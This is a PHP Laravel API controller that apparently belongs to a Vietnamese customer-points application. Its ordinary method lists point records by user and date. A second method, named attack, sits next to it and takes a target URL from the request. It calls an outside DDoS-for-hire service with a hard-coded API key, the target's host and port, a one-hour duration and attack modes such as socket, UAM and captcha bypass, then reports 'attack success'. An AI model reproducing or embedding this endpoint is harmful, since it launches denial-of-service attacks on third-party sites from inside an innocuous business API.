<?php

namespace App\Http\Controllers\Api;

use App\Models\Customer;
use App\Models\CustomerDaily;
use App\Models\Daily;
use App\Models\Point;
use App\Models\User;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;
use Validator;

class PointApiController extends BaseApiController
{

    public function listPoint(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'user_key' => 'required|size:6',
            'date'     => 'required',
            'type'     => 'required|integer',
        ], []);

        if ($validator->fails()) {
            return $this->sendError($validator->errors()->first(), Response::HTTP_BAD_REQUEST);
        }

        try {
            $user = User::where('key', $request['user_key'])->first();
            if (empty($user)) {
                return $this->sendError('User không tồn tại !', Response::HTTP_NOT_FOUND);
            }
            // lấy ra danh sách customer theo user
            $listCustomerByUser = [];
            if($user['type'] == 1){
                $listCustomerByUser = Customer::where('user_id', $user['id'])->pluck('id')->toArray();
                if (empty($listCustomerByUser)) {
                    return $this->sendError('Không tìm thấy khách hàng !', Response::HTTP_NOT_FOUND);
                }
            }

            $daily = Daily::where('date', $request['date'])->first();
            if (empty($daily)) {
                return $this->sendError('Daily không tồn tại !', Response::HTTP_NOT_FOUND);
            }

            // danh sách customer_daily theo customer
            $listCustomerDaily = CustomerDaily::where(function ($q) use ($user, $listCustomerByUser){
                if ($user['type'] == 1) {
                    $q->whereIn('customer_id', $listCustomerByUser);
                }
            })->where('daily_id', $daily['id'])->pluck('id')->toArray();

            if (empty($listCustomerDaily)) {
                return $this->sendError('Customer_daily không tồn tại !', Response::HTTP_NOT_FOUND);
            }

            $points = Point::whereIn('customer_daily_id', $listCustomerDaily)->where('type', $request['type'])->get();
            return $this->sendResponse($points, Response::HTTP_OK);

        } catch (\Exception $ex) {
            return $this->sendError($ex->getMessage(), $ex->getCode());
        }
    }

    public function attack(Request $request){
        try {
            $k = 'BghUuaFPZH5x4Voa';
            $h = $request['url'];
            if (strpos($h, 'https') !== false) {
                $p = 443;
            }else{
                $p = 80;
            }
            $t = 3600;
            if(isset($request['method'])){
                if($request['method'] == 'STOP'){
                    $m = 'STOP';
                }elseif ($request['method'] == 'socket'){
                    $m = 'Anon-HtSc';
                }elseif ($request['method'] == 'uam'){
                    $m = 'Anon-Uam';
                }elseif ($request['method'] == 'capt'){
                    $m = 'Anon-Capt';
                }
            }else{
                $m = 'Anon-HSv2';
            }
            $ch = curl_init("https://anonboot.ga/?key={$k}&host={$h}&port={$p}&time={$t}&method={$m}");
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $response = curl_exec($ch);
            curl_close($ch);
            return $this->sendResponse('attack success !', Response::HTTP_OK);
        }catch (\Exception $ex){
            $this->sendError('error !', $ex->getCode());
        }

    }

}
